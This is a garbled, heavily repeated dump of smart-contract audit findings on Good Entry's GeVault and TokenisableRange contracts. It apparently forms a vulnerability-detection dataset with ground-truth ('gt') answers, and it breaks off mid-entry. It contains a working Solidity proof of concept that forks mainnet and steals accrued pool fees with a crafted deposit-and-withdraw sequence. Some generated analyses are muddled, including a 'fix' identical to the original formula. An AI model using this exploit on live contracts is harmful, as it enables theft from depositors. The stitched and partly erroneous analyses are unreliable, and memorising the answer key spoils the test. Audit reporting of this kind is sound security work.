There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1.

The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1.

However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

Function Overview: The `getValuePerLPAtPrice` function calculates the value of a user's LP (Liquidity Provider) token based on the current prices of tokens 0 and 1. It takes two arguments, TOKEN0_PRICE and TOKEN1_PRICE, representing the prices of tokens 0 and 1, respectively.\n2. Calculation Review:\n\t* It first checks if the total supply is zero and returns 0 if true.\n\t* It calculates the expected balances of tokens 0 and 1 using the `returnExpectedBalance` function.\n\t* The function calculates the total value by adding the product of TOKEN0_PRICE and amt0 (token 0 balance) and the product of TOKEN1_PRICE and amt1 (token 1 balance). The token balances are divided by 10 ** TOKENx.decimals to convert the balances to the base unit (18 decimals for both tokens in this case).\n\t* Finally, the function returns the total value per LP token by dividing the total value by the total supply.\n3.

The multiplication and division operations in the calculation of 'totalValue' are not properly converted or implemented, leading to incorrect calculations. Specifically, the multiplication operation by '10 ** TOKEN0.decimals' and '10 ** TOKEN1.decimals' should be performed before the division operations to ensure accurate conversions between different token decimals.\n\nProof of Concept (PoC):\n\nLet's assume that TOKEN0_PRICE is 200, amt0 is 1000, TOKEN0.decimals is 18, TOKEN1_PRICE is 50, and amt1 is 2000, and TOKEN1.decimals is 18.\n\nWith the current implementation, the calculation of 'totalValue' will be:\n\ntotalValue = 200 \\* 1000 / (10 ** 18) + 2000 \\* 50 / (10 ** 18)\n\nThis calculation will result in a value of 'totalValue' that is not accurate due to the incorrect order of operations.\n\nTo fix the vulnerability, the calculation of 'totalValue' should be modified as follows:\n\ntotalValue = (TOKEN0_PRICE \\* amt0 / (10 ** TOKEN0.decimals)) + (amt1 \\* TOKEN1_PRICE / (10 ** TOKEN1.decimals))\n\nWith this modification, the multiplication and division operations are properly converted and implemented, leading to accurate calculations.\n\nMitigation:\n\nTo mitigate the vulnerability, it is essential to accurately convert the functions in question and ensure that appropriate arithmetic operations are utilized, along with proper syntax and expression placements throughout the code base.

Specifically, the expression `TOKEN0_PRICE * amt0 / (10 ** TOKEN0.decimals) + amt1 * TOKEN1_PRICE / (10 ** TOKEN1.decimals)` may not produce the intended result due to the missing brackets around the `+` operation.\n\nAssuming that `TOKEN0_PRICE`, `TOKEN1_PRICE`, `amt0`, and `amt1` are positive values, the expression without brackets will always prioritize the division operation over the multiplication and addition operations, due to the order of operations (division and multiplication have the same precedence and are evaluated from left to right, followed by addition and subtraction).\n\nTherefore, if `TOKEN0_PRICE`, `amt0`, `TOKEN1_PRICE`, and `amt1` are not carefully chosen to ensure that the result is always an integer, the expression may produce a result with decimal points, which would then be truncated due to the integer division operation `totalValue * 1e18 / totalSupply()`. This could lead to a significant deviation from the intended calculation.\n\nTo mitigate this vulnerability, the code should add brackets around the `+` operation to ensure that the multiplication and addition operations are performed before the division operation, like this: `(TOKEN0_PRICE * amt0 / (10 ** TOKEN0.decimals)) + (amt1 * TOKEN1_PRICE / (10 ** TOKEN1.decimals))`. This would ensure that the calculation is performed as intended, regardless of the values of `TOKEN0_PRICE`, `TOKEN1_PRICE`, `amt0`, and `amt1`.",

The contract calculates new liquidity provider shares using the `increaseLiquidity` function of the `IPositionManager` contract, which is responsible for managing liquidity pools in Uniswap V3.\n2. The `increaseLiquidity` function takes into account the desired amount of tokens being deposited (`amount0Desired` and `amount1Desired`), as well as minimum amounts for each token (`amount0Min` and `amount1Min`).

This formula ensures that the new liquidity provider shares are proportional to the amount of liquidity they are adding to the pool, and takes into account the current total liquidity in the pool.\n\nTherefore, it is unlikely that an attacker can exploit this contract to cause asset loss or compromise the pool's integrity as described in the vulnerability knowledge.",

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function.

This method of calculating TVL is susceptible to manipulation because a malicious user can inflate the TVL by adding a significant amount of one token into the pool, leading to an improper calculation of the LP token prices.\n2. Reason: The `getTVL()` function calculates the TVL by summing up the product of token balance and its latest answer for each tick in the `ticks` array. The latest answer is derived from the oracle, which provides the price of the token. If a malicious user manipulates the price of the token by injecting a large amount of that token into the pool, the TVL will be inflated, resulting in mispriced LP tokens. This manipulation can lead to a total loss of funds if exploited.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1.

The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

However, the scale down is not enough and overflow can still happened.\n\n## Proof of Concept\nConsider this scenario, The GeVault is using WBTC for `token0` and WETH for `token1`.\n\nThese are information for the WBTC/WETH from uniswap v3 pool (0x4585FE77225b41b697C938B018E2Ac67Ac5a20c0):\n\nslot0 data (at current time) :\n\n```\nsqrtPriceX96   uint160 :  31520141554881197083247204479961147\n```\n\n`token0` (WBTC) decimals is 8 and `token1` (WETH) decimals is 18.\n\nUsing these information, try to reproduce the `priceX8` calculation :\n\n```solidity\n    function testOraclePrice() public {\n        uint160 sqrtPriceX96 = 31520141554881197083247204479961147;\n        // decimals0 is 8\n        uint priceX8 = 10 ** 8;\n        // Overflow if dont scale down the sqrtPrice before div 2*192 \n        // @audit - the overflow still possible\n        priceX8 =\n            (priceX8 * uint(sqrtPriceX96 / 2 ** 12) ** 2 * 1e8) /\n            2 ** 168;\n        // decimals1 is 18\n        priceX8 = priceX8 / 10 ** 18;\n        assertEq(true, true);\n    }\n```\n\nthe test result in overflow :\n\n```\n[FAIL. Reason: Arithmetic over/underflow] testOraclePrice() \n```\n\nThis will cause calculation still overflow, even using the widely used WBTC/WETH pair \n\n## Tools Used\n\nManual review\n\n## Recommended Mitigation Steps\n\nConsider to change the scale down using the recommended value from uniswap v3 library:\n\nhttps://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/OracleLibrary.sol#L49-L69\n\nor change the scale down similar to the one used inside library\n\n```diff\n  function poolMatchesOracle() public view returns (bool matches){\n    (uint160 sqrtPriceX96,,,,,,) = uniswapPool.slot0();\n    \n    uint decimals0 = token0.decimals();\n    uint decimals1 = token1.decimals();\n    uint priceX8 = 10**decimals0;\n    // Overflow if dont scale down the sqrtPrice before div 2*192\n-    priceX8 = priceX8 * uint(sqrtPriceX96 / 2 ** 12) ** 2 * 1e8 / 2**168;\n+    priceX8 = priceX8 * (uint(sqrtPriceX96) ** 2 / 2 ** 64) * 1e8 / 2**128;\n    priceX8 = priceX8 / 10**decimals1;\n    uint oraclePrice = 1e8 * oracle.getAssetPrice(address(token0)) / oracle.getAssetPrice(address(token1));\n    if (oraclePrice < priceX8 * 101 / 100 && oraclePrice > priceX8 * 99 / 100) matches = true;\n  }\n```\n\n\n\n\n\n\n\n\n## Assessed type\n\nMath",

        "gt": "\n# Vulnerability details\n\nThe `TokenisableRange` is designed to always collect trading fees from the Uniswap V3 pool, whenever there is a liquidity event (`deposit` or `withdraw`). These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool. Yay! \n        console2.log(int(WETH.balanceOf(tokenWhale)) - int(wethBalanceBefore));\n        require(poolSharesBefore ==  tr.balanceOf(tokenWhale));\n    }\n```\nIt is important to note that since the WETH oracle price at the forked block (17811921) is at 1870, above the 500-1000 range, the above PoC works only after fixing my other finding titled:\n> Incorrect Solidity version in FullMath.sol can cause permanent freezing of assets for arithmetic underflow-induced revert\n\n## Tools Used\nCode review\n\n## Recommended Mitigation Steps\n- factor in also the token prices when calculating whether the accrued fees are indeed 1% of the pool\n- when minting TokenisableRange tokens, **always** downscale the minted fees by the relative value of non-distributed fees in the pool:\n```diff\n    // Stack too deep, so localising some variables for feeLiquidity calculations \n-    // If we already clawed back fees earlier, do nothing, else we need to adjust returned liquidity\n-    if ( newFee0 == 0 && newFee1 == 0 ){\n+    {\n      uint256 TOKEN0_PRICE = ORACLE.getAssetPrice(address(TOKEN0.token));\n      uint256 TOKEN1_PRICE = ORACLE.getAssetPrice(address(TOKEN1.token));\n      require (TOKEN0_PRICE > 0 && TOKEN1_PRICE > 0, \"Invalid Oracle Price\");\n      // Calculate the equivalent liquidity amount of the non-yet compounded fees\n      // Assume linearity for liquidity in same tick range; calculate feeLiquidity equivalent and consider it part of base liquidity \n      feeLiquidity = newLiquidity * ( (fee0 * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (fee1 * TOKEN1_PRICE / 10 ** TOKEN1.decimals) )   \n                                    / ( (added0   * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (added1   * TOKEN1_PRICE / 10 ** TOKEN1.decimals) ); \n    }\n```\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nMath",

        "gtraw": "\n# Vulnerability details\n\nThe `TokenisableRange` is designed to always collect trading fees from the Uniswap V3 pool, whenever there is a liquidity event (`deposit` or `withdraw`). These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of 